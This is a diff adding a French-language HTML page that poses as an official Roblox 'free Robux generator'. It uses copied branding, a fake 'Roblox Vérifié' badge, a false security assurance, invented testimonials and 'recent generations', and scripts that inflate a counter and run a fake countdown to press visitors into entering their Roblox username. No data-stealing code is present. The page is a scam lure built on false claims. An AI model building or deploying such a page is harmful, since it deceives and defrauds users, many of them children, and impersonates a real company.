@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Free Robux Generator 2025</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        /* Header moderne et rassurant */
+        .roblox-header {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            padding: 1rem 0;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .roblox-logo {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #667eea;
+        }
+
+        .roblox-logo i {
+            font-size: 2rem;
+        }
+
+        .main-nav {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav-link {
+            text-decoration: none;
+            color: #555;
+            font-weight: 600;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            color: #667eea;
+            background: rgba(102, 126, 234, 0.1);
+        }
+
+        .user-area {
+            display: flex;
+            gap: 1.5rem;
+            align-items: center;
+        }
+
+        .robux-balance {
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            padding: 0.6rem 1.2rem;
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 700;
+            color: #333;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.6rem 1rem;
+            background: rgba(102, 126, 234, 0.1);
+            border-radius: 25px;
+            font-weight: 600;
+            color: #667eea;
+        }
+
+        .user-info i {
+            font-size: 1.5rem;
+        }
+
+        /* Banner chaleureux */
+        .promo-banner {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
+            padding: 3rem 2rem;
+            margin: 2rem auto;
+            max-width: 1400px;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .promo-banner::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -10%;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .banner-content {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            color: white;
+        }
+
+        .banner-content h1 {
+            font-size: 3rem;
+            font-weight: 900;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .banner-content > p {
+            font-size: 1.4rem;
+            margin-bottom: 2rem;
+            opacity: 0.95;
+        }
+
+        .banner-stats {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            flex-wrap: wrap;
+        }
+
+        .stat {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            padding: 1.5rem 2.5rem;
+            border-radius: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .stat-number {
+            display: block;
+            font-size: 2rem;
+            font-weight: 900;
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-label {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+
+        /* Container principal */
+        .main-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 2rem;
+        }
+
+        /* Section générateur moderne */
+        .generator-section {
+            background: white;
+            border-radius: 24px;
+            padding: 2.5rem;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+
+        .section-header h2 {
+            font-size: 2rem;
+            color: #333;
+        }
+
+        .verified-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: linear-gradient(135deg, #00d084 0%, #00b371 100%);
+            color: white;
+            padding: 0.6rem 1.2rem;
+            border-radius: 25px;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(0, 208, 132, 0.3);
+        }
+
+        /* Packages avec effet glassmorphism */
+        .robux-packages {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .package-card {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1) 0%, rgba(118, 75, 162, 0.1) 100%);
+            border: 2px solid rgba(102, 126, 234, 0.2);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .package-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .package-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.3);
+            border-color: #667eea;
+        }
+
+        .package-card:hover::before {
+            opacity: 1;
+        }
+
+        .package-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .package-info h3 {
+            font-size: 1.6rem;
+            margin-bottom: 1rem;
+            color: #333;
+        }
+
+        .package-price {
+            margin-bottom: 1rem;
+        }
+
+        .original-price {
+            text-decoration: line-through;
+            color: #999;
+            font-size: 1rem;
+            margin-right: 0.5rem;
+        }
+
+        .free-price {
+            color: #00d084;
+            font-size: 1.8rem;
+            font-weight: 900;
+        }
+
+        .popularity {
+            margin-bottom: 1rem;
+        }
+
+        .popularity-badge {
+            display: inline-block;
+            padding: 0.4rem 1rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .popularity-badge.premium {
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            color: #333;
+        }
+
+        .popularity-badge.legendary {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%);
+        }
+
+        .popularity-badge.ultimate {
+            background: linear-gradient(135deg, #9d50bb 0%, #6e48aa 100%);
+        }
+
+        .generate-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .generate-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
+        }
+
+        /* Formulaire chaleureux */
+        .generator-form {
+            background: linear-gradient(135deg, rgba(255, 107, 107, 0.1) 0%, rgba(255, 142, 83, 0.1) 100%);
+            border: 2px solid rgba(255, 107, 107, 0.2);
+            border-radius: 20px;
+            padding: 2rem;
+        }
+
+        .generator-form h3 {
+            color: #333;
+            margin-bottom: 1.5rem;
+            font-size: 1.4rem;
+        }
+
+        .form-group {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .username-input {
+            flex: 1;
+            padding: 1rem 1.5rem;
+            border: 2px solid rgba(102, 126, 234, 0.3);
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .username-input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+        }
+
+        .verify-btn {
+            background: linear-gradient(135deg, #00d084 0%, #00b371 100%);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 208, 132, 0.3);
+        }
+
+        .verify-btn:hover {
+            transform: scale(1.05);
+        }
+
+        .security-notice {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            color: #00d084;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        /* Section info */
+        .info-section {
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+        }
+
+        .how-it-works, .recent-generations, .testimonials {
+            background: white;
+            border-radius: 20px;
+            padding: 2rem;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+        }
+
+        .how-it-works h3, .recent-generations h3, .testimonials h3 {
+            color: #333;
+            margin-bottom: 1.5rem;
+            font-size: 1.4rem;
+        }
+
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1) 0%, rgba(118, 75, 162, 0.1) 100%);
+            border-radius: 12px;
+        }
+
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 1.2rem;
+        }
+
+        .step-text {
+            font-weight: 600;
+            color: #555;
+        }
+
+        .generation-item {
+            display: flex;
+            gap: 1rem;
+            padding: 1rem;
+            background: rgba(102, 126, 234, 0.05);
+            border-radius: 12px;
+            margin-bottom: 1rem;
+        }
+
+        .user-avatar {
+            font-size: 2.5rem;
+            color: #667eea;
+        }
+
+        .generation-content {
+            flex: 1;
+        }
+
+        .username {
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 0.3rem;
+        }
+
+        .amount {
+            color: #00d084;
+            font-weight: 600;
+            margin-bottom: 0.2rem;
+        }
+
+        .timestamp {
+            font-size: 0.85rem;
+            color: #999;
+        }
+
+        .testimonial {
+            padding: 1.5rem;
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1) 0%, rgba(255, 237, 78, 0.1) 100%);
+            border-radius: 12px;
+            margin-bottom: 1rem;
+        }
+
+        .stars {
+            font-size: 1.2rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .testimonial p {
+            color: #555;
+            margin-bottom: 0.8rem;
+            font-style: italic;
+        }
+
+        .reviewer {
+            font-weight: 700;
+            color: #667eea;
+        }
+
+        /* Footer rassurant */
+        .roblox-footer {
+            background: rgba(255, 255, 255, 0.95);
+            margin-top: 3rem;
+            padding: 2rem 0;
+            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .footer-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #764ba2;
+        }
+
+        .footer-text {
+            color: #777;
+            font-size: 0.9rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .main-container {
+                grid-template-columns: 1fr;
+            }
+
+            .robux-packages {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .main-nav {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .banner-content h1 {
+                font-size: 2rem;
+            }
+
+            .banner-stats {
+                gap: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="roblox-header">
+        <div class="header-container">
+            <div class="roblox-logo">
+                <i class="fas fa-cube"></i>
+                <span>Roblox</span>
+            </div>
+            <nav class="main-nav">
+                <a href="#" class="nav-link">DÉCOUVRIR</a>
+                <a href="#" class="nav-link">MARKETPLACE</a>
+                <a href="#" class="nav-link">CRÉER</a>
+                <a href="#" class="nav-link active">ROBUX</a>
+                <a href="#" class="nav-link">GROUPES</a>
+            </nav>
+            <div class="user-area">
+                <div class="robux-balance">
+                    <i class="fas fa-coins"></i>
+                    <span>0 Robux</span>
+                </div>
+                <div class="user-info">
+                    <span>Invité</span>
+                    <i class="fas fa-user-circle"></i>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="roblox-body">
+        <div class="promo-banner">
+            <div class="banner-content">
+                <h1>GÉNÉRATEUR ROBUX GRATUIT 2025</h1>
+                <p>Obtenez des Robux gratuits instantanément !</p>
+                <div class="banner-stats">
+                    <div class="stat">
+                        <span class="stat-number" id="robux-generated">2,847,392</span>
+                        <span class="stat-label">Robux Générés</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number" id="time-left">23:45:30</span>
+                        <span class="stat-label">Offre Expire</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">47,829</span>
+                        <span class="stat-label">Utilisateurs Actifs</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="main-container">
+            <div class="generator-section">
+                <div class="section-header">
+                    <h2>Générateur Robux Gratuit</h2>
+                    <div class="verified-badge">
+                        <i class="fas fa-shield-check"></i>
+                        <span>Roblox Vérifié</span>
+                    </div>
+                </div>
+
+                <div class="robux-packages">
+                    <div class="package-card">
+                        <div class="package-icon">
+                            <i class="fas fa-coins"></i>
+                        </div>
+                        <div class="package-info">
+                            <h3>1,000 Robux</h3>
+                            <div class="package-price">
+                                <span class="original-price">9,99€</span>
+                                <span class="free-price">GRATUIT</span>
+                            </div>
+                            <div class="popularity">
+                                <span class="popularity-badge">Le Plus Populaire</span>
+                            </div>
+                            <button class="generate-btn">
+                                <i class="fas fa-magic"></i>
+                                GÉNÉRER MAINTENANT
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="package-card">
+                        <div class="package-icon">
+                            <i class="fas fa-gem"></i>
+                        </div>
+                        <div class="package-info">
+                            <h3>2,500 Robux</h3>
+                            <div class="package-price">
+                                <span class="original-price">24,99€</span>
+                                <span class="free-price">GRATUIT</span>
+                            </div>
+                            <div class="popularity">
+                                <span class="popularity-badge premium">Premium</span>
+                            </div>
+                            <button class="generate-btn">
+                                <i class="fas fa-magic"></i>
+                                GÉNÉRER MAINTENANT
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="package-card">
+                        <div class="package-icon">
+                            <i class="fas fa-crown"></i>
+                        </div>
+                        <div class="package-info">
+                            <h3>5,000 Robux</h3>
+                            <div class="package-price">
+                                <span class="original-price">49,99€</span>
+                                <span class="free-price">GRATUIT</span>
+                            </div>
+                            <div class="popularity">
+                                <span class="popularity-badge legendary">Légendaire</span>
+                            </div>
+                            <button class="generate-btn">
+                                <i class="fas fa-magic"></i>
+                                GÉNÉRER MAINTENANT
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="package-card">
+                        <div class="package-icon">
+                            <i class="fas fa-trophy"></i>
+                        </div>
+                        <div class="package-info">
+                            <h3>10,000 Robux</h3>
+                            <div class="package-price">
+                                <span class="original-price">99,99€</span>
+                                <span class="free-price">GRATUIT</span>
+                            </div>
+                            <div class="popularity">
+                                <span class="popularity-badge ultimate">Ultime</span>
+                            </div>
+                            <button class="generate-btn">
+                                <i class="fas fa-magic"></i>
+                                GÉNÉRER MAINTENANT
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="generator-form">
+                    <h3>Entrez votre nom d'utilisateur Roblox</h3>
+                    <div class="form-group">
+                        <input type="text" id="username-input" placeholder="Votre nom d'utilisateur Roblox" class="username-input">
+                        <button class="verify-btn">
+                            <i class="fas fa-search"></i>
+                            VÉRIFIER
+                        </button>
+                    </div>
+                    <div class="security-notice">
+                        <i class="fas fa-lock"></i>
+                        <span>Votre compte est protégé par les protocoles de sécurité Roblox</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <div class="how-it-works">
+                    <h3>Comment ça marche</h3>
+                    <div class="steps">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-text">Choisissez le montant de Robux</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-text">Entrez votre nom d'utilisateur</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-text">Vérifiez votre compte</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">4</div>
+                            <div class="step-text">Recevez vos Robux gratuits</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="recent-generations">
+                    <h3>Générations Récentes</h3>
+                    <div class="generation-list">
+                        <div class="generation-item">
+                            <div class="user-avatar">
+                                <i class="fas fa-user-circle"></i>
+                            </div>
+                            <div class="generation-content">
+                                <div class="username">RobloxMaster123</div>
+                                <div class="amount">A généré 2,500 Robux</div>
+                                <div class="timestamp">Il y a 2 minutes</div>
+                            </div>
+                        </div>
+                        <div class="generation-item">
+                            <div class="user-avatar">
+                                <i class="fas fa-user-circle"></i>
+                            </div>
+                            <div class="generation-content">
+                                <div class="username">GamerPro999</div>
+                                <div class="amount">A généré 5,000 Robux</div>
+                                <div class="timestamp">Il y a 5 minutes</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="testimonials">
+                    <h3>Avis des Utilisateurs</h3>
+                    <div class="testimonial">
+                        <div class="stars">⭐⭐⭐⭐⭐</div>
+                        <p>"Ça marche vraiment ! J'ai reçu 5000 Robux en quelques minutes !"</p>
+                        <div class="reviewer">- GameMaster2025</div>
+                    </div>
+                    <div class="testimonial">
+                        <div class="stars">⭐⭐⭐⭐⭐</div>
+                        <p>"Le meilleur générateur de Robux gratuit. 100% légitime !"</p>
+                        <div class="reviewer">- RobloxPro999</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="roblox-footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">À propos</a>
+                <a href="#">Aide</a>
+                <a href="#">Conditions</a>
+                <a href="#">Confidentialité</a>
+                <a href="#">Sécurité</a>
+                <a href="#">Relations Investisseurs</a>
+            </div>
+            <div class="footer-text">
+                <p>&copy; 2025 Roblox Corporation. Tous droits réservés. Roblox et le logo Roblox sont des marques de Roblox Corporation.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Animation du compteur de Robux générés
+        function animateCounter() {
+            const counter = document.getElementById('robux-generated');
+            let current = parseInt(counter.textContent.replace(/,/g, ''));
+            setInterval(() => {
+                current += Math.floor(Math.random() * 100) + 50;
+                counter.textContent = current.toLocaleString('fr-FR');
+            }, 3000);
+        }
+
+        // Animation du timer
+        function animateTimer() {
+            const timer = document.getElementById('time-left');
+            let [hours, minutes, seconds] = timer.textContent.split(':').map(Number);
+            
+            setInterval(() => {
+                seconds--;
+                if (seconds < 0) {
+                    seconds = 59;
+                    minutes--;
+                    if (minutes < 0) {
+                        minutes = 59;
+                        hours--;
+                        if (hours < 0) hours = 23;
+                    }
+                }
+                timer.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
+
+        animateCounter();
+        animateTimer();
+    </script>
+</body>
+</html>
